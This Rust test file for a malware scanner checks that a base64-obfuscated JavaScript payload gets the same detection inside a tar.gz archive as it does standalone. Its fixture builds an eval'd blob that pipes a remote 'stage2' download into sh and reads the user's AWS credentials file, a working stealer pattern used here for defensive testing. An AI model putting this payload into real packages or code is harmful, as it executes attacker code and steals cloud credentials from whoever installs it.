//! Regression guard: an archive member must get the SAME encoded-payload
//! analysis as the identical file scanned standalone.
//!
//! The `metadata/encoded-payload/*` finding emission AND the recursive analysis
//! of decoded payload bytes live in `process_encoded_payloads` (lib.rs). For a
//! long time that ran ONLY for top-level files: the archive member path
//! (`analyzers/archive/analyzers.rs::analyze_extracted_member`) extracted
//! payloads to feed the per-file analyzer but never emitted the encoded-payload
//! findings or analyzed the decoded content. The effect: an obfuscated payload
//! buried in an npm tarball / zip / jar lost its encoded-payload finding (and
//! every trait derived from the decoded bytes) that the same file gets when
//! scanned alone — silently weakening detection for exactly the place malware
//! hides. A second, related downgrade had archive members skip the XOR scan
//! that standalone files get — both now resolve through filefacts' single
//! string-extraction path.
//!
//! These tests pin the invariant: detection must not depend on whether a file
//! was scanned standalone or as an archive member. XOR and base64 detection are
//! load-bearing, so a regression here should fail CI loudly.

use base64::Engine;
use cleave::{AnalysisOptions, AnalysisReport, analyze_file};

fn opts() -> AnalysisOptions {
    AnalysisOptions {
        disable_yara: true,
        disable_radare2: true,
        disable_upx: true,
        ..Default::default()
    }
}

/// A JS file carrying a base64 blob that decodes to clearly actionable code —
/// the encoded-payload extractor flags this `metadata/encoded-payload/base64`.
fn base64_payload_js() -> Vec<u8> {
    let decoded = b"const cp = require('child_process'); \
        cp.execSync('curl -s http://198.51.100.23/stage2 | sh'); \
        const fs = require('fs'); fs.readFileSync(process.env.HOME + '/.aws/credentials');";
    let b64 = base64::engine::general_purpose::STANDARD.encode(decoded);
    format!("const blob = \"{b64}\";\neval(Buffer.from(blob, 'base64').toString('utf8'));\n")
        .into_bytes()
}

fn encoded_payload_ids(findings: &[cleave::Finding]) -> Vec<&str> {
    findings
        .iter()
        .map(|f| f.id.as_str())
        .filter(|id| id.starts_with("metadata/encoded-payload/"))
        .collect()
}

/// Encoded-payload findings anywhere in the report (top-level or any member).
fn report_encoded_payload_count(r: &AnalysisReport) -> usize {
    let top = encoded_payload_ids(&r.findings).len();
    let members: usize = r
        .files
        .iter()
        .map(|m| encoded_payload_ids(&m.findings).len())
        .sum();
    top + members
}

fn write_tar_gz(path: &std::path::Path, member_name: &str, bytes: &[u8]) -> std::io::Result<()> {
    let f = std::fs::File::create(path)?;
    let enc = flate2::write::GzEncoder::new(f, flate2::Compression::default());
    let mut tar = tar::Builder::new(enc);
    let mut header = tar::Header::new_gnu();
    header.set_size(bytes.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append_data(&mut header, member_name, bytes)?;
    tar.into_inner()?.finish()?;
    Ok(())
}

#[test]
fn base64_encoded_payload_detected_in_archive_member_same_as_standalone() -> anyhow::Result<()> {
    let dir = tempfile::tempdir()?;
    let js = base64_payload_js();

    // Baseline: the file standalone must surface a base64 encoded-payload finding.
    let js_path = dir.path().join("index.js");
    std::fs::write(&js_path, &js)?;
    let standalone = analyze_file(&js_path, &opts())?;
    let standalone_hits = report_encoded_payload_count(&standalone);
    assert!(
        standalone_hits > 0,
        "fixture sanity: standalone .js must detect the base64 payload \
         (no metadata/encoded-payload/* finding). Adjust the fixture."
    );

    // The SAME file inside a .tar.gz must surface the same detection on the member.
    let tgz_path = dir.path().join("pkg.tar.gz");
    write_tar_gz(&tgz_path, "package/index.js", &js)?;
    let archive = analyze_file(&tgz_path, &opts())?;
    let member_hits: usize = archive
        .files
        .iter()
        .map(|m| encoded_payload_ids(&m.findings).len())
        .sum();
    assert!(
        member_hits > 0,
        "archive member must detect the base64 encoded payload that the same \
         file detects standalone (standalone={standalone_hits}, member=0, \
         {} member files). Regression: encoded-payload analysis not run on \
         archive members.",
        archive.files.len()
    );

    Ok(())
}

#[test]
fn archive_member_max_criticality_matches_standalone() -> anyhow::Result<()> {
    // Beyond the encoded-payload finding itself, the recursive decoded-payload
    // analysis contributes traits/findings that raise the member's peak
    // criticality. Pin that the member doesn't grade strictly weaker than the
    // same file standalone (the concrete symptom: an npm stealer scoring
    // max-crit 5 alone but only 4 inside its tarball).
    let dir = tempfile::tempdir()?;
    let js = base64_payload_js();

    let js_path = dir.path().join("index.js");
    std::fs::write(&js_path, &js)?;
    let standalone = analyze_file(&js_path, &opts())?;
    let standalone_max = standalone
        .findings
        .iter()
        .map(|f| f.crit as u8)
        .max()
        .unwrap_or(0);

    let tgz_path = dir.path().join("pkg.tar.gz");
    write_tar_gz(&tgz_path, "package/index.js", &js)?;
    let archive = analyze_file(&tgz_path, &opts())?;
    let member_max = archive
        .files
        .iter()
        .flat_map(|m| m.findings.iter())
        .map(|f| f.crit as u8)
        .max()
        .unwrap_or(0);

    assert!(
        member_max >= standalone_max,
        "archive member peak criticality ({member_max}) must not be weaker than \
         the same file standalone ({standalone_max}) — decoded-payload analysis \
         is missing on the member path."
    );

    Ok(())
}
